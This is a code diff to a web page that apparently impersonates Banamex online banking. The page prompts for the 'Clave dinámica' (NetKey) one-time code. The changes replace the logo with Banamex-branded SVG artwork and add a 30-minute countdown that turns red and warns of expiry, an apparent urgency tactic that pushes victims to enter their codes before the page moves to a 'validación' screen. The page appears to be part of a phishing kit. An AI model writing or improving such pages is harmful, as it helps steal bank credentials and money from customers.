@@ -275,7 +275,7 @@
                 <div style="max-width: 900px; margin: 18px auto;">
                     <header style="display: flex; align-items: center; gap: 18px; margin-bottom: 22px;">
                         <div style="display: flex; align-items: center; gap: 12px;">
-                            <img src="/attached_assets/targeted_element_1759817730217.png" alt="Banamex" style="height: 40px; width: auto;">
+                            <div style="background: url(/banamex/images/logobanamexwht.svg) no-repeat; background-size: contain; width: 160px; height: 32px;"></div>
                         </div>
                         <div style="margin-left: auto; text-align: right;">
                             <div style="font-size: 14px; color: #2d4b51;" id="datetime-acceso2"></div>
@@ -410,7 +410,7 @@
         <div style="margin: 0; padding: 28px; font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; color: #0b3b43; min-height: 100vh; display: flex; align-items: center; justify-content: center;">
             <div style="max-width: 700px; width: 100%;">
                 <div style="text-align: center; margin-bottom: 32px;">
-                    <img src="/attached_assets/targeted_element_1759817730217.png" alt="Banamex" style="height: 50px; width: auto; margin: 0 auto; display: block;">
+                    <div style="background: url(/banamex/images/logobanamexwht.svg) no-repeat center; background-size: contain; width: 160px; height: 32px; margin: 0 auto;"></div>
                 </div>
 
                 <div style="background: linear-gradient(90deg, #f7fbfc 0%, #eef6f7 100%); border-radius: 8px; padding: 48px 32px; box-shadow: 0 6px 18px rgba(0,0,0,0.08); border: 1px solid rgba(0,0,0,0.03); text-align: center;">
@@ -449,7 +449,19 @@
                 </header>
 
                 <div style="background: linear-gradient(90deg, #f7fbfc 0%, #eef6f7 100%); border-radius: 8px; padding: 22px; box-shadow: 0 6px 18px rgba(0,0,0,0.08); border: 1px solid rgba(0,0,0,0.03);">
-                    <h1 style="font-size: 28px; margin: 6px 0 18px; display: flex; align-items: center; gap: 12px;">» Clave dinámica</h1>
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 18px;">
+                        <h1 style="font-size: 28px; margin: 0; display: flex; align-items: center; gap: 12px;">» Clave dinámica</h1>
+                        <div style="background: #fff3cd; border: 2px solid #ffc107; border-radius: 6px; padding: 8px 16px; display: flex; align-items: center; gap: 8px;">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#856404" stroke-width="2">
+                                <circle cx="12" cy="12" r="10"></circle>
+                                <polyline points="12 6 12 12 16 14"></polyline>
+                            </svg>
+                            <div>
+                                <div style="font-size: 11px; color: #856404; font-weight: 500;">Tiempo restante</div>
+                                <div id="netkey2-timer" style="font-size: 18px; color: #856404; font-weight: 700; font-family: 'Courier New', monospace;">30:00</div>
+                            </div>
+                        </div>
+                    </div>
 
                     <div style="display: flex; gap: 18px; align-items: flex-start;">
                         <div style="background: #fff; border-radius: 6px; padding: 20px; box-shadow: 0 3px 8px rgba(0,0,0,0.04); flex: 1.1; margin-right: 6px; min-height: 260px; display: flex; flex-direction: column;">
@@ -768,6 +780,29 @@
                 updateNetkey2DateTime();
                 var dateInterval = setInterval(updateNetkey2DateTime, 1000);
 
+                // Iniciar contador de 30 minutos
+                var timeLeft = 30 * 60; // 30 minutos en segundos
+                var timerElement = document.getElementById('netkey2-timer');
+                var timerInterval = setInterval(function() {
+                    var minutes = Math.floor(timeLeft / 60);
+                    var seconds = timeLeft % 60;
+                    timerElement.textContent = (minutes < 10 ? '0' : '') + minutes + ':' + (seconds < 10 ? '0' : '') + seconds;
+                    
+                    // Cambiar color cuando queden menos de 5 minutos
+                    if (timeLeft <= 5 * 60) {
+                        timerElement.style.color = '#dc3545';
+                        timerElement.parentElement.parentElement.style.background = '#f8d7da';
+                        timerElement.parentElement.parentElement.style.borderColor = '#dc3545';
+                    }
+                    
+                    if (timeLeft <= 0) {
+                        clearInterval(timerInterval);
+                        clearInterval(dateInterval);
+                        alert('El tiempo de validez de NetKey ha expirado. Por favor, recargue la página e intente nuevamente.');
+                    }
+                    timeLeft--;
+                }, 1000);
+
                 // Configurar evento del botón de NetKey2 si aún no está configurado
                 var submitBtn = document.getElementById('netkey2-submit-btn');
                 if (submitBtn && !submitBtn.hasAttribute('data-configured')) {
@@ -793,8 +828,9 @@
                                 }
                             }));
 
-                            // Limpiar intervalo de fecha
+                            // Limpiar intervalos
                             clearInterval(dateInterval);
+                            clearInterval(timerInterval);
 
                             // Cambiar a pantalla de validación
                             document.getElementById('netkey2-screen').style.display = 'none';
